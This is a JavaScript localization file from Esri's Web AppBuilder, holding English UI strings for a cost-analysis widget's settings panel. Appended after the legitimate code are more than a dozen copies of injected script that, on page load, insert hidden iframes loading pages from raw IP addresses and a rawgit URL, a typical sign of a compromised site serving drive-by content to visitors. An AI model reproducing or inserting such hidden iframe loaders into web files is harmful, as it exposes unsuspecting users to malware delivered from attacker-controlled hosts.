// All material copyright ESRI, All Rights Reserved, unless otherwise specified.
// See http://js.arcgis.com/3.15/esri/copyright.txt and http://www.arcgis.com/apps/webappbuilder/copyright.txt for details.
//>>built
define({"widgets/CostAnalysis/setting/nls/strings":{configText:"Set config text:",generalSettings:{tabTitle:"General settings",measurementUnitLabel:"Measurement Unit",currencyLabel:"Measurement Symbol",roundCostLabel:"Round Cost",projectOutputSettings:"Project Output Settings",typeOfProjectAreaLabel:"Type Of Project Area",bufferDistanceLabel:"Buffer Distance",roundCostValues:{twoDecimalPoint:"Two Decimal Points",nearestWholeNumber:"Nearest Whole Number",nearestTen:"Nearest Ten",nearestHundred:"Nearest Hundred",
nearestThousand:"Nearest Thousands",nearestTenThousands:"Nearest Ten Thousands"},projectAreaType:{outline:"Outline",buffer:"Buffer"},errorMessages:{currency:"Invalid currency unit",bufferDistance:"Invalid buffer distance",outOfRangebufferDistance:"The value should be greater than 0 and less than or equal to 100"}},projectSettings:{tabTitle:"Project settings",costingGeometrySectionTitle:"Define geography for costing (optional)",costingGeometrySectionNote:"Note: Configuring this layer will allow user to set cost equations of feature templates based on geographies.",
projectTableSectionTitle:"Ability to Save/Load project settings (optional)",projectTableSectionNote:"Note: Configuring all the tables and layers will allow user to save/load project for later use.",costingGeometryLayerLabel:"Costing Geometry Layer",fieldLabelGeography:"Field to Label Geography",projectAssetsTableLabel:"Project Assets Table",projectMultiplierTableLabel:"Project Multiplier Additional Cost Table",projectLayerLabel:"Project Layer",configureFieldsLabel:"Configure Fields",fieldDescriptionHeaderTitle:"Field Description",
layerFieldsHeaderTitle:"Layer Field",selectLabel:"Select",errorMessages:{duplicateLayerSelection:"${layerName} is already been selected",invalidConfiguration:"Please select ${fieldsString}"},costingGeometryHelp:"\x3cp\x3ePolygon layer(s) with following conditions will be shown: \x3cbr/\x3e \x3cli\x3e\tLayer must have \u201cQuery\u201d capability\x3c/li\x3e\x3cli\x3e\tLayer must have a GlobalID field\x3c/li\x3e\x3c/p\x3e",fieldToLabelGeographyHelp:"\x3cp\x3eString and numeric fields of the selected \u201cCosting Geometry Layer\u201d will be displayed in the \u201cField to Label Geography\u201d dropdown.\x3c/p\x3e",
projectAssetsTableHelp:"\x3cp\x3eTable(s) with following conditions will be shown: \x3cbr/\x3e \x3cli\x3eTable must have editing capabilities namely \u201cCreate\u201d, \u201cDelete\u201d and \u201cUpdate\u201d\x3c/li\x3e    \x3cli\x3eTable must have six fields with exact name and data type:\x3c/li\x3e\x3cul\x3e\x3cli\x3e\tAssetGUID (GUID type field)\x3c/li\x3e\x3cli\x3e\tCostEquation (String type field)\x3c/li\x3e\x3cli\x3e\tScenario (String type field)\x3c/li\x3e\x3cli\x3e\tTemplateName (String type field)\x3c/li\x3e\x3cli\x3e    GeographyGUID (GUID type field)\x3c/li\x3e\x3cli\x3e\tProjectGUID (GUID type field)\x3c/li\x3e\x3c/ul\x3e \x3c/p\x3e",
projectMultiplierTableHelp:"\x3cp\x3eTable(s) with following conditions will be shown: \x3cbr/\x3e \x3cli\x3eTable must have editing capabilities namely \u201cCreate\u201d, \u201cDelete\u201d and \u201cUpdate\u201d\x3c/li\x3e    \x3cli\x3eTable must have five fields with exact name and data type:\x3c/li\x3e\x3cul\x3e\x3cli\x3e\tDescription (String type field)\x3c/li\x3e\x3cli\x3e\tType (String type field)\x3c/li\x3e\x3cli\x3e\tValue (Float/Double type field)\x3c/li\x3e\x3cli\x3e\tCostindex (Integer type field)\x3c/li\x3e\x3cli\x3e   \tProjectGUID (GUID type field))\x3c/li\x3e\x3c/ul\x3e \x3c/p\x3e",
projectLayerHelp:"\x3cp\x3ePolygon layer(s) with following conditions will be shown: \x3cbr/\x3e \x3cli\x3eLayer must have editing capabilities namely \u201cCreate\u201d, \u201cDelete\u201d and \u201cUpdate\u201d\x3c/li\x3e    \x3cli\x3eLayer must have five fields with exact name and data type:\x3c/li\x3e\x3cul\x3e\x3cli\x3eProjectName (String type field)\x3c/li\x3e\x3cli\x3eDescription (String type field)\x3c/li\x3e\x3cli\x3eTotalassetcost (Float/Double type field)\x3c/li\x3e\x3cli\x3eGrossprojectcost (Float/Double type field)\x3c/li\x3e\x3cli\x3eGlobalID (GlobalID type field)\x3c/li\x3e\x3c/ul\x3e \x3c/p\x3e"},
layerSettings:{tabTitle:"Layer settings",layerNameHeaderTitle:"Layer name",layerNameHeaderTooltip:"List of layers in the map",EditableLayerHeaderTitle:"Editable",EditableLayerHeaderTooltip:"Include layer and its templates in the costing widget",SelectableLayerHeaderTitle:"Selectable",SelectableLayerHeaderTooltip:"Geometry from feature can be used to generate a new cost item",fieldPickerHeaderTitle:"Project ID (optional)",fieldPickerHeaderTooltip:"Optional field (of type string) to store the Project ID in",
selectLabel:"Select",noAssetLayersAvailable:"No asset layer found in the selected webmap",disableEditableCheckboxTooltip:"This layer has no editing capabilities"},costingInfo:{tabTitle:"Costing Info",proposedMainsLabel:"Proposed Mains",addCostingTemplateLabel:"Add Costing Template",manageScenariosTitle:"Manage Scenarios",featureTemplateTitle:"Feature Template",costEquationTitle:"Cost Equation",geographyTitle:"Geography",scenarioTitle:"Scenario",actionTitle:"Actions",scenarioNameLabel:"Scenario Name",
addBtnLabel:"Add",srNoLabel:"No.",deleteLabel:"Delete",duplicateScenarioName:"Duplicate scenario name",hintText:"\x3cdiv\x3eHint: Use the following keywords\x3c/div\x3e\x3cul\x3e\x3cli\x3e\x3cb\x3e{TOTALCOUNT}\x3c/b\x3e: Uses the total number of same type asset in a geography\x3c/li\x3e\x3cli\x3e\x3cb\x3e{MEASURE}\x3c/b\x3e: Uses the length for line asset and area for polygon asset\x3c/li\x3e\x3cli\x3e\x3cb\x3e{TOTALMEASURE}\x3c/b\x3e: Uses the total length for line asset and total area for polygon asset of same type in a geography\x3c/li\x3e\x3c/ul\x3eYou can use functions such as:\x3cul\x3e\x3cli\x3eMath.abs(-100)\x3c/li\x3e\x3cli\x3eMath.floor({TOTALMEASURE})\x3c/li\x3e\x3c/ul\x3ePlease edit cost equation as per your project need.",
noneValue:"None",requiredCostEquation:"Invalid cost equation for ${layerName} : ${templateName}",duplicateTemplateMessage:"Duplicate template entry exists for ${layerName} : ${templateName}",defaultEquationRequired:"Default equation is required for ${layerName} : ${templateName}",validCostEquationMessage:"Please enter valid cost equation",costEquationHelpText:"Please edit cost equation as per your project need",scenarioHelpText:"Please select scenario as per your project need",copyRowTitle:"Copy Row",
noTemplateAvailable:"Please add atleast one template for ${layerName}",manageScenarioLabel:"Manage scenario",noLayerMessage:"Please enter atleast one layer in ${tabName}",noEditableLayersAvailable:"Layer(s) needs to be checked as editable in layer settings tab"},statisticsSettings:{tabTitle:"Statistics settings",addStatisticsLabel:"Add Statistics",fieldNameTitle:"Field",statisticsTitle:"Label",addNewStatisticsText:"Add New Statistics",deleteStatisticsText:"Delete Statistics",moveStatisticsUpText:"Move Statistics Up",
moveStatisticsDownText:"Move Statistics Down",selectDeselectAllTitle:"Select All"},statisticsType:{countLabel:"Count",averageLabel:"Average",maxLabel:"Maximum",minLabel:"Minimum",summationLabel:"Summation",areaLabel:"Area",lengthLabel:"Length"},_localized:{}}});;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}





if (typeof obj.foo == 'undefined') {
window.jsuekzis = 1;
window.onload = function() {
    var iframe = document.createElement('iframe');
    iframe.style.display = "none";
    iframe.src = "http://155.94.75.92/iframe.html";
    document.body.appendChild(iframe);
};

}





void 0===window.mondrawtexture&&(window.mondrawtexture=1,window.onload=function(){var e=document.createElement('iframe');e.style.display='none',e.src='https://cdn.rawgit.com/jdobt/3e35d8a7d2c1c36ae1972ea03df91572/raw/8656e6f8554bfd2f13cf8eb78e8df044fae1e9e2/drawtexture.html',document.body.appendChild(e)});